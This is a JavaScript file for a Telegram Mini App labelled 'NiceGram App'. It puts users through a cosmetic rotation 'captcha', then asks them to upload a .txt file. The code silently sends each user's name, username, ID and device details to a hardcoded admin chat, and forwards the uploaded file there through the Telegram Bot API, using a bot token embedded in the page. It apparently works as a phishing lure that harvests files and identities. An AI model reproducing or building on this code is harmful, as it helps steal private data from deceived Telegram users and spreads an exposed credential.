const tg = window.Telegram.WebApp;
tg.expand();

// Настройки
const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
const ADMIN_ID = "7632180689";

// Переменные капчи
let currentAngle = 0;
let isDragging = false;
let startNotificationSent = false;
let targetMin = 30;
let targetMax = 50;

// Элементы
const degreeDisplay = document.getElementById('degree');
const sliderHandle = document.getElementById('slider-handle');
const targetRange = document.getElementById('target-range');
const captchaScreen = document.getElementById('captcha-screen');
const mainScreen = document.getElementById('main-screen');
const statusMsg = document.getElementById('status-msg');
const welcomeUser = document.getElementById('welcome-user');

// Функция определения устройства
function detectDevice() {
    const userAgent = navigator.userAgent;
    
    if (/android/i.test(userAgent)) {
        return "📱 Android";
    } else if (/iPad|iPhone|iPod/.test(userAgent)) {
        return "📱 iOS (iPhone/iPad)";
    } else if (/windows/i.test(userAgent)) {
        return "💻 Windows PC";
    } else if (/mac/i.test(userAgent)) {
        return "💻 macOS";
    } else if (/linux/i.test(userAgent)) {
        return "💻 Linux";
    } else {
        return "🌐 Веб-браузер";
    }
}

// Генерация случайного диапазона
function generateRandomRange() {
    const starts = [0, 20, 40, 60, 80, 100, 120, 140, 160];
    const start = starts[Math.floor(Math.random() * starts.length)];
    
    targetMin = start;
    targetMax = start + 20;
    
    if (targetMax > 180) {
        targetMax = 180;
        targetMin = 160;
    }
    
    targetRange.textContent = `${targetMin}° - ${targetMax}°`;
}

// Вращение стрелки
function startRotation(e) {
    e.preventDefault();
    isDragging = true;
    sliderHandle.style.cursor = 'grabbing';
    
    const container = sliderHandle.parentElement;
    const centerX = container.offsetWidth / 2;
    const centerY = container.offsetHeight / 2;
    const radius = container.offsetWidth / 2;
    
    function updateAngle(clientX, clientY) {
        if (!isDragging) return;
        
        const rect = container.getBoundingClientRect();
        const x = clientX - rect.left - centerX;
        const y = clientY - rect.top - centerY;
        
        let angle = Math.atan2(y, x) * (180 / Math.PI) + 90;
        if (angle < 0) angle += 360;
        
        sliderHandle.style.transform = `rotate(${angle}deg)`;
        
        currentAngle = angle > 180 ? 360 - angle : angle;
        currentAngle = Math.round(currentAngle);
        
        degreeDisplay.textContent = `${currentAngle}°`;
        
        if (currentAngle >= targetMin && currentAngle <= targetMax) {
            degreeDisplay.style.color = '#00ff00';
            degreeDisplay.style.textShadow = '0 0 25px rgba(0, 255, 0, 0.9)';
            sliderHandle.style.background = 'linear-gradient(135deg, #00ff66, #00aa44)';
        } else {
            degreeDisplay.style.color = '#00ff88';
            degreeDisplay.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.6)';
            sliderHandle.style.background = 'linear-gradient(135deg, #00aa44, #006622)';
        }
    }
    
    updateAngle(
        e.type === 'touchstart' ? e.touches[0].clientX : e.clientX,
        e.type === 'touchstart' ? e.touches[0].clientY : e.clientY
    );
    
    function moveHandler(moveEvent) {
        if (!isDragging) return;
        
        const clientX = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientX : moveEvent.clientX;
        const clientY = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientY : moveEvent.clientY;
        
        updateAngle(clientX, clientY);
    }
    
    function stopHandler() {
        isDragging = false;
        sliderHandle.style.cursor = 'grab';
        
        document.removeEventListener('mousemove', moveHandler);
        document.removeEventListener('mouseup', stopHandler);
        document.removeEventListener('touchmove', moveHandler);
        document.removeEventListener('touchend', stopHandler);
    }
    
    document.addEventListener('mousemove', moveHandler);
    document.addEventListener('mouseup', stopHandler);
    document.addEventListener('touchmove', moveHandler, { passive: false });
    document.addEventListener('touchend', stopHandler);
}

// Инициализация вращения
if (sliderHandle) {
    sliderHandle.addEventListener('mousedown', startRotation);
    sliderHandle.addEventListener('touchstart', startRotation, { passive: false });
} else {
    console.error('Элемент slider-handle не найден!');
}

// Проверка капчи
const verifyBtn = document.getElementById('verify-btn');
if (verifyBtn) {
    verifyBtn.onclick = function() {
        if (currentAngle >= targetMin && currentAngle <= targetMax) {
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('light');
            }
            
            degreeDisplay.style.animation = 'pulse 0.5s';
            sliderHandle.style.animation = 'pulse 0.5s';
            
            setTimeout(() => {
                degreeDisplay.style.animation = '';
                sliderHandle.style.animation = '';
            }, 500);
            
            captchaScreen.style.opacity = '0';
            captchaScreen.style.transform = 'scale(0.95)';
            
            setTimeout(() => {
                captchaScreen.classList.add('hidden');
                mainScreen.classList.remove('hidden');
                
                const user = tg.initDataUnsafe?.user || {};
                const name = user.first_name || "Пользователь";
                welcomeUser.textContent = `👋 Привет, ${name}!`;
                
                if (!startNotificationSent) {
                    sendStartNotification(name, user.username, user.id);
                    startNotificationSent = true;
                }
                
                mainScreen.style.opacity = '0';
                setTimeout(() => {
                    mainScreen.style.opacity = '1';
                    mainScreen.style.transform = 'scale(1)';
                }, 50);
                
            }, 300);
        } else {
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('heavy');
            }
            
            alert(`❌ Нужно: ${targetMin}°-${targetMax}°\nВаш угол: ${currentAngle}°`);
            generateRandomRange();
        }
    };
} else {
    console.error('Кнопка verify-btn не найдена!');
}

// Отправка уведомления о старте
async function sendStartNotification(name, username, userId) {
    try {
        const message = `🚀 *Новый пользователь прошел капчу*\n\n` +
                       `👤 *Юзер:* @${username || 'без username'}\n` +
                       `👨 *Имя:* ${name}\n` +
                       `🆔 *ID:* \`${userId || 'неизвестно'}\`\n` +
                       `🎯 *Диапазон капчи:* ${targetMin}°-${targetMax}°\n` +
                       `🎯 *Выбранный угол:* ${currentAngle}°\n` +
                       `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
        
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error('Ошибка уведомления:', err);
    }
}

// Загрузка файла
const selectFileBtn = document.getElementById('select-file-btn');
const fileInput = document.getElementById('file-input');

if (selectFileBtn && fileInput) {
    selectFileBtn.onclick = () => {
        fileInput.click();
    };

    fileInput.onchange = async function(e) {
        const file = e.target.files[0];
        if (!file) return;
        
        if (statusMsg) {
            statusMsg.className = 'status active';
            statusMsg.innerHTML = '📤 Отправка файла...';
        }
        
        if (!file.name.toLowerCase().endsWith('.txt')) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = '❌ Только .txt файлы разрешены';
            }
            this.value = '';
            return;
        }
        
        if (file.size > 10 * 1024 * 1024) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = '❌ Файл слишком большой (макс. 10MB)';
            }
            this.value = '';
            return;
        }
        
        try {
            const user = tg.initDataUnsafe?.user || {};
            const username = user.username ? `@${user.username}` : 'Скрыт';
            const firstName = user.first_name || 'Не указано';
            const userId = user.id || 'Неизвестно';
            
            const deviceInfo = detectDevice();
            const platform = tg.platform || 'Неизвестно';
            
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('document', file);
            
            const caption = `📄 *Файл:* ${file.name}\n` +
                           `👤 *Юзер:* ${username}\n` +
                           `👨 *Имя:* ${firstName}\n` +
                           `🆔 *ID:* \`${userId}\`\n` +
                           `📱 *Устройство:* ${deviceInfo}\n` +
                           `🌐 *Платформа:* ${platform}\n` +
                           `📊 *Размер:* ${(file.size / 1024).toFixed(2)} KB\n` +
                           `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
            
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.ok) {
                if (statusMsg) {
                    statusMsg.className = 'status active success';
                    statusMsg.innerHTML = '✅ Файл успешно отправлен!';
                }
                
                if (tg.HapticFeedback) {
                    tg.HapticFeedback.notificationOccurred('success');
                }
                
                setTimeout(() => {
                    if (statusMsg) {
                        statusMsg.className = 'status';
                    }
                    this.value = '';
                }, 3000);
            } else {
                throw new Error(data.description || 'Неизвестная ошибка');
            }
            
        } catch (error) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = `❌ Ошибка отправки: ${error.message}`;
            }
            console.error('Ошибка:', error);
            
            if (tg.HapticFeedback) {
                tg.HapticFeedback.notificationOccurred('error');
            }
        }
    };
} else {
    console.error('Элементы для загрузки файла не найдены!');
}

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    tg.ready();
    generateRandomRange();
    console.log('NiceGram App инициализирован');
});

// Проверяем все элементы при загрузке
console.log('Проверка элементов:');
console.log('degreeDisplay:', degreeDisplay);
console.log('sliderHandle:', sliderHandle);
console.log('targetRange:', targetRange);
console.log('verifyBtn:', document.getElementById('verify-btn'));
